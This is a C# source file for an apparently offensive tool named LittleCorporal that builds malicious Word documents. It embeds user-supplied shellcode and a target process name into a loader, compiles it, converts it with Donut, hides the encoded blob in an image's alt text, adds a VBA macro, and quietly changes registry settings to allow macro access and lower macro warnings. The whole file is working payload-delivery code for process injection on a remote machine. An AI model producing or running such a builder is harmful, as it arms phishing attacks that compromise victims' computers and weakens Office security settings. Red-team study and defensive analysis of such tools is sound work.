﻿using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Data.SqlTypes;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Globalization;
using Microsoft.Vbe.Interop;
using Microsoft.Win32;
using System.Runtime.CompilerServices;
using System.Net.NetworkInformation;
using System.Drawing;
using Microsoft.Office.Interop.Word;
using System.Security.Cryptography.X509Certificates;

namespace LittleCorporal
{
    class Program
    {
        public static void AsciiArt()
        {
            // Obligatory ASCII art
            Console.WriteLine(".____    .__  __    __  .__         _________                                         .__");
            Console.WriteLine("|    |   |__|/  |__/  |_|  |   ____ \\_   ___ \\  _________________   ________________  |  |");
            Console.WriteLine("|    |   |  \\   __\\   __\\  | _/ __ \\/    \\  \\/ /  _ \\_  __ \\____ \\ /  _ \\_  __ \\__  \\ |  |");
            Console.WriteLine("|    |___|  ||  |  |  | |  |_\\  ___/\\     \\___(  <_> )  | \\/  |_> >  <_> )  | \\// __ \\|  |__");
            Console.WriteLine("| _______ \\__||__|  |__| |____/\\___  >\\______  /\\____/|__|  |   __/ \\____/|__|  (____  /____/");
            Console.WriteLine("        \\/                        \\/        \\/             |__|                     \\/");
            Console.WriteLine("\n");
            Console.WriteLine("             ________");
            Console.WriteLine("            /        \\");
            Console.WriteLine("         __ /       (o)\\__");
            Console.WriteLine("        /     ______\\   \\                   I am the strongest debater in the whole Conseil.");
            Console.WriteLine("        | ____/__  __\\____|                 I let myself be attacked, because I know how to defend myself.");
            Console.WriteLine("           [  --~~--  ]                                                              - Napoleon Bonaparte");
            Console.WriteLine("            | (  L   )|");
            Console.WriteLine("      ___----\\  __  /----___");
            Console.WriteLine("     /   |  < \\____/ >   |   \\");
            Console.WriteLine("    /    |   < \\--/ >    |    \\");
            Console.WriteLine("    ||||||    \\ \\/ /     ||||||");
            Console.WriteLine("    |          \\  /   o       |");
            Console.WriteLine("    |     |     \\/   === |    |");
            Console.WriteLine("    |     |      |o  ||| |    |");
            Console.WriteLine("    |     \\______|   +#* |    |");
            Console.WriteLine("    |            |o      |    |");
            Console.WriteLine("     \\           |      /     /");
            Console.WriteLine("     |\\__________|o    /     /");
            Console.WriteLine("     |           |    /     /");
        }

        // Send the shellcode through Donut
        public static string DonutShellcode()
        {
            // Resolve the path of Donut
            string currentdirectoryTemp = Directory.GetCurrentDirectory();
            var donutPath = Path.Combine(currentdirectoryTemp, "..\\..\\Donut\\donut.exe");

            // Run the generated artifact through Donut
            var assemblyPath = Path.Combine(currentdirectoryTemp, "..\\..\\Artifacts\\LittleCorporal_Loader.exe");
            var outputPath = Path.Combine(currentdirectoryTemp, "..\\..\\Artifacts\\payload.bin");
            string donutArguments = $"-f {assemblyPath} -o {outputPath}";
            var processDonut = new Process();
            processDonut.StartInfo.RedirectStandardOutput = true;
            processDonut.StartInfo.UseShellExecute = false;
            processDonut.StartInfo.CreateNoWindow = true;
            processDonut.StartInfo.FileName = donutPath;
            processDonut.StartInfo.Arguments = donutArguments;
            processDonut.Start();
            processDonut.WaitForExit();

            // Print update
            Console.WriteLine("[+] Ran the .NET assembly through Donut!");

            // Locate Donut artifact
            int index = currentdirectoryTemp.IndexOf("bin");
            string donutArtifact = currentdirectoryTemp.Substring(0, index) + "Artifacts\\payload.bin";

            // Print update
            Console.WriteLine("[+] Donut artifact is located at: {0}", donutArtifact);

            // Return the path of the Donut artifact
            return donutArtifact;
        }

        // Create the 
        public static void CreateWordDoc(string donutartifactLocation)
        {
            // Store the shellcode blob path from Donut
            donutartifactLocation = DonutShellcode();

            // Open the Donut bin file and convert to Base64 encoded string
            FileStream fsDonut = new FileStream(donutartifactLocation, FileMode.Open);
            BinaryReader brDonut = new BinaryReader(fsDonut);
            byte[] tempbinDonut = brDonut.ReadBytes(Convert.ToInt32(fsDonut.Length));
            string donutblobString = Convert.ToBase64String(tempbinDonut);

            // Create instance of Word
            Microsoft.Office.Interop.Word.Application winWord = new Microsoft.Office.Interop.Word.Application
            {

                // Make Word invisible 
                Visible = false,

                // Disable alerting
                // 0 = wdAlertsNone
                DisplayAlerts = 0
            };

            // Satisfy System.Runtime.InteropServices.COMException: Programmatic access to Visual Basic Project is not trusted. error
            var wordVersion = winWord.Version;
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE", true).CreateSubKey($"Microsoft\\Office\\{wordVersion}\\Word\\Security");
            regKey.SetValue($"AccessVBOM", 1, RegistryValueKind.DWord);
            regKey.Close();
            RegistryKey regKey1 = Registry.CurrentUser.OpenSubKey("SOFTWARE", true).CreateSubKey($"Microsoft\\Office\\{wordVersion}\\Word\\Security");
            regKey1.SetValue($"VBAWarnings", 1, RegistryValueKind.DWord);
            regKey1.Close();

            // Create an object that refers to a missing value
            // Document.Add method in Microsoft.Office.Interop.Word expectes a reference to an object
            // Specifying a missing value makes Word create the document with all defaults
            object missingObject = System.Reflection.Missing.Value;

            // Create the document
            Microsoft.Office.Interop.Word.Document wordDocument = winWord.Documents.Add(ref missingObject, ref missingObject, ref missingObject, ref missingObject);

            // Add in remote picture and set alternative text as shellcode blob
            string urlName = "https://www.publicdomainpictures.net/pictures/30000/t2/plain-white-background.jpg";
            winWord.ActiveDocument.InlineShapes.AddPicture(urlName, false, true).AlternativeText = donutblobString;

            // Create VBProject
            var vbaProject = wordDocument.VBProject;
            var addTo = wordDocument.VBProject.VBComponents.Add(vbext_ComponentType.vbext_ct_StdModule);

            // Read in the VBA template
            var getcurrentPath = Directory.GetCurrentDirectory();
            var vbaPath = Path.Combine(getcurrentPath, "..\\..\\VBA\\VBA_Template.txt");
            string vbaText = File.ReadAllText(vbaPath);

            // Write the VBA macro
            addTo.CodeModule.AddFromString(vbaText);

            // Save the document
            var worddocumentPath = Path.Combine(getcurrentPath, "..\\..\\Artifacts\\Form.doc");
            object wordPath = worddocumentPath;

            // Specifying 0 to make sure the macro is saved
            wordDocument.SaveAs(ref wordPath, 0);
            
            // Print update
            Console.Write("[+] Path to Word document: {0}\n", wordDocument.Path + "\\" + wordDocument.Name);

            // Close the document and quit Word
            wordDocument.Close(ref missingObject, ref missingObject, ref missingObject);
            wordDocument = null;
            winWord.Quit(ref missingObject, ref missingObject, ref missingObject);
            winWord = null;
        }

        static void Main(string[] args)
        {
            // Print ASCII art
            AsciiArt();

            // If no arguments are displayed, print the usage
            if (args.Length == 0)
            {
                Console.WriteLine("\n[+] Usage: LittleCorporal.exe C:\\Path\\To\\Shellcode.bin name_of_desired_injection_process_on_remote_machine.exe");
            }

            // Make sure command line arguments don't surpass two (shellcode path and remote argument)
            else if (args.Length > 2 || args.Length < 2)
            {
                Console.WriteLine("\n[-] Error! Please only enter a shellcode path and process to inject in!\n");
                Console.WriteLine("[+] Usage: LittleCorporal.exe C:\\Path\\To\\Shellcode.bin name_of_desired_injection_process_on_remote_machine.exe");
            }
            else
            {
                // Parse arguments
                string shellcodePath = args[0];
                string targetProcess = args[1];

                // Verify the shellcode file exists
                bool exists = File.Exists(shellcodePath);

                // Error handling
                if (!exists)
                {
                    Console.WriteLine("[-] Error! Could not find shellcode file. Does it exist? Did you specify the correct path?\n");
                    Environment.Exit(0);
                }
                else
                {
                    // Print parsed arguments
                    Console.WriteLine("\n[+] Parsed Arguments:\n   [>] Shellcode Path: {0}\n   [>] Target Process: {1}\n", shellcodePath, targetProcess);

                    // Trim off .exe for eventual call to GetProcessByName in Loader.cs if the user supplied one
                    string trimmedString = targetProcess;
                    bool doesExist = targetProcess.Contains(".exe");
                    if (doesExist)
                    {
                        trimmedString = targetProcess.Replace(".exe", "");
                    }

                    // Open the shellcode file and convert to Base64 encoded string
                    FileStream fs = new FileStream(shellcodePath, FileMode.Open);
                    BinaryReader br = new BinaryReader(fs);
                    byte[] tempBin = br.ReadBytes(Convert.ToInt32(fs.Length));
                    string shellcodeString = Convert.ToBase64String(tempBin);

                    // Replace the process name and the byte array in the LittleCorporal.Loader project
                    // Resolve the path and save the file into the text variable
                    var tempPath = Directory.GetCurrentDirectory();
                    var path = Path.Combine(tempPath, "..\\..\\LittleCorporal.Loader\\Loader.cs");
                    string text = File.ReadAllText(path);

                    // Replace the placeholder with the shellcode blob
                    text = text.Replace("REPLACE1", trimmedString);
                    File.WriteAllText(path, text);
                    text = text.Replace("REPLACE2", shellcodeString);
                    File.WriteAllText(path, text);

                    // Print update
                    Console.WriteLine("[+] Embedded shellcode in Loader.cs!");

                    // Compile LittleCorporal.Loader as an .exe artifact
                    string cscPath = @"C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe";
                    var outputPath = Path.Combine(tempPath, "..\\..\\Artifacts\\LittleCorporal_Loader.exe");
                    string compileArguments = "/out:" + outputPath + " " + path;
                    var process = new Process();
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.FileName = cscPath;
                    process.StartInfo.Arguments = compileArguments;
                    process.Start();
                    process.WaitForExit();

                    // Print update
                    Console.WriteLine("[+] Generated C# Loader artifact!");

                    // After compiling, switch everything back
                    text = text.Replace(trimmedString, "REPLACE1");
                    File.WriteAllText(path, text);
                    text = text.Replace(shellcodeString, "REPLACE2");
                    File.WriteAllText(path, text);

                    // Create the Word document
                    CreateWordDoc(shellcodeString);       
                }
            }
        }
    }
}
